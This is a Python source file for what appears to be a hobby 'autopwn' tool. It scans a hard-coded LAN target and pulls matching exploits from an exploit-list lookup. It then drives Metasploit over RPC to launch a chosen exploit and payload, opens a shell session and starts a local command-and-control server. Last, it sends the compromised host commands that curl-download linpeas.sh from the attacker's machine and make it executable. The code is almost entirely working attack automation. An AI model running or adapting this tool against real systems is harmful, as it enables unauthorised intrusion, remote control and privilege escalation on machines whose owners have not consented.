#!/usr/bin/python3

import subprocess
import pprint
import json
import autopayload
from pymetasploit3.msfrpc import MsfRpcClient
import time
from logs import LOG
import post.postexploit as postexploit

RED = "\033[1;31m"
YELLOW = "\033[33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

LOW = "Low"
MEDIUM = BLUE + "Medium" + RESET
HIGH = YELLOW + "High" + RESET
CRITICAL = RED + "Critical" + RESET

SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}


logfile = open("./logtest", "a+")

LOG("Launched autopwn.", logfile, "inf")

IP = "192.168.1.45"
CMD = (
    "./explookup.sh " + IP + " >> /dev/null"
)  # Sortie standard dans /dev/null pour la lisibilité, à changer
EXPLOIT_LIST = "./exploit_list"


def show_pwnguin():
    """Displays pwngin ASCII art logo, nothing useful"""
    print(
        f"""
                                            (#(
                                        @@@/#&@&
                                  (&@@@,#&&@@&&&&&&&@@(
                             #@@@( %&&&&&&&@@@@@@@@@@
                         ,@@%/&&&&@@@@@@@@@@@@@@@@@@@@,
                       @@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@&
                    ,@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                   @@@&&@@&@#,,&@@@@@@@@@@@@@@@@%**%@@@@@@@@&
                 #@@@@@@%          %@@@@@@@@(          @@@@@@@,
                @@@@@@@   @@&        (@@@@,        @@&  /@@@@@@&
               @@@@@@@.    ,%@{RED}@@{RESET}&,     %     /@{RED}@@{RESET}@(,    #@@@@@@&
              @@@@@@@@    ..@@{RED}&..{RESET}@@@.    #@@{RED}@...@{RESET}@@,     @@@@@@@#
             &@@@@@@@@      {BLUE},@@@@@@{RESET}  .{YELLOW}%({RESET}  {BLUE}./@@@@@@,{RESET}      @@@@@@@@/
            /@@#&@@@@@            ,@{YELLOW}@&.  /@{RESET}@@            @@@@@&%@@
            @@/&&#@@@@@          @@{YELLOW}((/,*///%{RESET}@%          @@@@@%&&#@@
           .@&%@&@,@@@@@         .,/@{YELLOW}@/(((@{RESET}@,.          @@@@@.&&@#@@
           ,@(@@@&&,/@@@@.         ...{YELLOW}%@@/{RESET},.          ,@@@@,(&@@@&&@.
            """
    )


def scanIp4Vulnerabilities(exploit_path=EXPLOIT_LIST, cmd=CMD, ip=IP) -> list:
    """Scans IP loofing for vulnerabilities and output the
    related exploit list to be parsed (in json)
    """
    scan = subprocess.run(cmd, shell=True)
    if scan:
        msg = "Launching scan over @" + ip + " cmd :" + cmd
        print("[i] Launching scan over @" + ip + " cmd :" + cmd)
        LOG(msg, logfile, "log")
    else:
        LOG("Error 1 : nmap failed.", logfile, "err")
        print("[X] Error 1 : nmap failed.")
        exit(-1)
    with open(exploit_path, "r+") as f:
        result = json.loads(f.read())
    return result


def createExploitList(res=[]) -> list[str]:
    """Create exploits / metasploits lists from the list of research
    returns (titles, metaexploits)
    """
    exploits = []
    for search in res:
        exploits += search["RESULTS_EXPLOIT"]
    LOG("Imported exploit_list", logfile, "log")
    if exploits:
        titles = []
        for k, pwn in enumerate(exploits):
            titles.append([k, pwn["Title"]])
    else:
        LOG("Error 2 : Parsing error.", logfile, "err")
        print("[X] Error 2 : Parsing error.")
        exit(-2)
    LOG("Parsed ./exploit_list", logfile, "log")
    metaexploits = []
    for j in range(len(titles)):
        if "(Metasploit)" in titles[j][1]:
            metaexploits.append(titles[j])
    return (titles, metaexploits)


def selectExploit(choice=0, titles=[]) -> str:
    return titles[int(choice)][1][:-12]


def runMetasploit(reinit=False) -> MsfRpcClient:
    """Launch metasploit instance and returns associated client
    It is also possible to reinit the db if reinit = True (must be root!!!)
    """
    proc = subprocess.run("msfrpcd -P yourpassword", shell=True)
    time.sleep(5)
    LOG("Started process msfrpcd", logfile, "inf")

    if reinit:
        proc = subprocess.run("echo yes | msfdb reinit", shell=True)  # if db problem
        LOG("Started process msfdb (arg reinit)", logfile, "inf")

    client = MsfRpcClient("yourpassword", ssl=True)
    print("\n")
    return client


def selectModules(client=None, attack="") -> list[str]:
    modules = client.modules.search(attack)
    modulus = []
    for mod in modules:
        modulus.append([mod["type"], mod["fullname"]])

    print("[~] Available modules :")
    for k in range(len(modulus)):
        pprint.pprint(str(k) + " : " + modulus[k][0] + " : " + modulus[k][1])
    LOG("Displayed modules", logfile, "log")
    return modulus


def exploitVuln(client=None, modlist=[]) -> None:
    """Execute selected payload on the targeted"""
    exploit = client.modules.use(modlist[0][0], modlist[0][1])
    print("[V] Selected payloads: ", exploit.info)

    print("Exploit options :")
    print(exploit.options)
    print("\n")

    plds = exploit.targetpayloads()
    print("[~] Available payloads :")
    pprint.pprint(plds)
    print("[-1 for autochosing]")
    pay_idx = int(input("Which payload do you want to use ? :"))

    print("")
    if pay_idx == -1:
        tmp = autopayload.autochose(exploit.targetpayloads())
        if tmp == -1:
            payload = client.modules.use("payload", plds[0])
            print("No usual payload available, reflected to : " + plds[0])
        else:
            payload = client.modules.use("payload", tmp)
            print("Autopayload selected : " + tmp)
    else:
        payload = client.modules.use("payload", plds[pay_idx])
    print("[V] Payload selected !")
    LOG("User selected payload", logfile, "log")
    print("\n")

    for i in payload.missing_required:
        payload[i] = input(i + ": ")

    for i in exploit.missing_required:
        exploit[i] = input(i + ": ")

    print(exploit.execute(payload=payload))

    while len(client.jobs.list) != 0:
        pass


def getShell(client=None, id="1"):
    """Get shell from ID session"""
    LOG("Shell obtained", logfile, "log")
    return client.sessions.session(id)


def autopwn():
    show_pwnguin()

    results = scanIp4Vulnerabilities(EXPLOIT_LIST, CMD, IP)
    (exploits, metaexploits) = createExploitList(results)

    print("[~] Generic exploits :")
    if exploits:
        pprint.pprint(exploits)
        print("\n")
    else:
        LOG("Error 3 : No exploit found on Metasploit.", logfile, "err")
        print("[X] Error 3 : No exploit found on Metasploit.")
        exit(-3)
    LOG("Displayed possible exploits to user", logfile, "log")

    print("[~] Metasploit exploits :")
    if metaexploits:
        pprint.pprint(metaexploits)
        print("\n")
    else:
        LOG("Error 3 : No exploit found on Metasploit.", logfile, "err")
        print("[X] Error 3 : No exploit found on Metasploit.")
        exit(-3)
    LOG("Displayed possible exploits to user", logfile, "log")

    choice = input("[~] Please select an exploit: ")
    attack = selectExploit(choice, exploits)

    print("[V] Exploit selected ! :")
    print(attack)
    print("\n")
    LOG("User selected " + attack, logfile, "log")

    print("Starting msfrpcd...")
    client = runMetasploit(False)
    modlist = selectModules(client, attack)
    exploitVuln(client, modlist)

    print(client.sessions.list)
    print("\n")

    shell = getShell(client, "1")

    print("[~] Entering command and control section")
    LOG("Entered in C&C section", logfile, "inf")

    print("[~] Opening local C2 server ...")
    (proc, port) = postexploit.openCtrlSrv("192.168.1.86")
    ipport = "http://192.168.1.86:" + str(port)

    print("[V] Pwn complete !!! ")
    return (shell, client, ipport)

 # ,
    # "./linpeas.sh -o users_information,software_information"]

# if shell:
#     for command in sequence:
#         print(command)
#         shell.write(command)
#         time.sleep(5) # Todo : modifier le sleep
#         print(shell.read())
#         if(str(shell.read()).isprintable()):
#             print(str(shell.read()))
#         else:
#             print("coucou")

def sendCommands(shell, sequence=[]) -> int:
    """Automated interaction with shell on target"""
    if (len(sequence) == 0):
        print("[X] Error 5 : Invalid sequence.")
        LOG("[X] Error 5 : Invalid sequence.", logfile, "err")
        return -5
    
    # if (shell == None):
    #     print("[X] Error 6 : Invalid shell.")
    #     LOG("[X] Error 6 : Invalid shell.", logfile, "err")
    #     return -6
    
    for command in sequence:
        print(command)
        shell.write(command)
        time.sleep(5) # Todo : modifier le sleep
        print(shell.read())
    return 0



(shell, client, srv) = autopwn()

sequence = [
        "whoami",
        "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
        "pwd",
        "chown root:root linpeas.sh",
        "echo 0xcafedeadbeef",
        "chmod +x linpeas.sh",
        "echo matthislemechan"
] 

lol = sendCommands(shell,sequence)

LOG("END OF LOGS", logfile, "crit")
logfile.close()
exit(0)
